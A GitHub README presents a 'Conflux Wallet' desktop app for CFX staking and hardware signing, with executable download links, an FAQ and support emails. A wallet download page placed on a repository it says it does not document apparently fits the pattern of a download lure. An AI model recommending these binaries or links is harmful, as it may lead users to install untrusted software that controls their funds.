![Conflux Wallet](assets/banner-profile.png)

<h1 align="center">Conflux Wallet</h1>

<p align="center">Staking and hardware signing in the same desktop app as your CFX.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-GPL--3.0-30A0D0?style=for-the-badge&labelColor=101010" alt="License: GPL-3.0"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

---

## Downloads - v0.6.14

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

> Only download from this GitHub release page.

---

## Why Conflux Wallet on web3pay-contract

Staking CFX usually means a second interface, a second login and a second place where your keys could be asked for. Conflux Wallet keeps the position inside the wallet you already use: staked, unlocking and reward balances sit beside spendable CFX, and the lock periods are the network's own rather than the wallet's summary of them.

Hardware signing works the same way. A Ledger or a Trezor holds the key, the app builds the transaction, and nothing is signed until you approve it on the device. The detail that catches people is the pairing, not the concept: the model, its firmware, the app selected on the device and the space you are working in all have to agree.

- Core Space staking with staked, unlocking and reward balances shown beside spendable CFX.
- Ledger and Trezor supported for both spaces, with each transaction approved on the device.
- Unstaking and the voting lock handled in the app rather than by contract call.
- Reward rates are never quoted: they vary by mechanism and period, so the app shows your position.

This repository is part of the Conflux Wallet GitHub presence and points at the staking and hardware guides rather than repeating them.

## Who it is for

- You hold CFX on Core Space and want to stake it without a second interface or a second login.
- You sign with a Ledger or a Trezor and want each transaction approved on the device.
- You are planning an exit and need to know why an unstake is not immediate.

## Your first ten minutes

1. Open the staking view and confirm the wallet is on Core Space, because staking does not exist on eSpace.
2. Check that the account holds at least 1,000 CFX for the vote you intend to lock.
3. Cast the vote and note the staked, unlocking and reward balances as they appear beside spendable CFX.
4. Connect the hardware device, open the right app on it, and approve one small transaction to prove the pairing.
5. Read the unstake guide before you need it: the 13-day entry period comes first, and the balance returns in stages.

## What this page covers, and what it does not

This page is about what the wallet does with a staked position and a hardware signature. It does not document this repository's contracts, their interfaces or their deployment, and it quotes no reward rate: the rate varies by mechanism and period, so the app shows your position instead. A reward figure copied from an old post is the most common wrong number in staking questions, which is why none appears here.

## Questions before you download

### Can I stake CFX on eSpace?

No. Staking is a Core Space operation, and the staking view only acts on Core Space accounts. eSpace holds CFX for contracts and transfers, not for votes.

### Why is my unstaked CFX not available yet?

A voting position returns in stages, and the 13-day entry period comes before the unlock. The balance is visible as unlocking rather than spendable until the process finishes.

### Does a Trezor sign Core Space transactions?

Trezor is documented for eSpace, where it signs through the Ethereum app. For Core Space, the hardware guide names the device and app combination that works, so check it before you lock a position.

---

## Guides

<div align="center">

| Guide | What it covers |
|---|---|
| [Stake CFX in Conflux Wallet](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/stake-cfx-in-conflux-wallet.md) | Stake CFX in Conflux Wallet: the checks, in order, for the current desktop release. |
| [Connect Ledger to Conflux Wallet](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/connect-ledger-to-conflux-wallet.md) | Connect Ledger to Conflux Wallet: the checks, in order, for the current desktop release. |
| [Unstake CFX Locked for Voting](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/unstake-conflux-cfx-locked-for-voting.md) | Unstake CFX Locked for Voting: the checks, in order, for the current desktop release. |

</div>

[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)

---

**Security:** download only from this release page, and never share a recovery phrase, private key, password or keystore file with anyone, including support.

## Support

Wallet help: support@confluxwallet.net. Business and legal: office@confluxwallet.net.

## License

GPL-3.0

[Main application](https://github.com/conflux-developments/conflux-desktop-wallet) - [Release v0.6.14](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14) - [Guide index](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
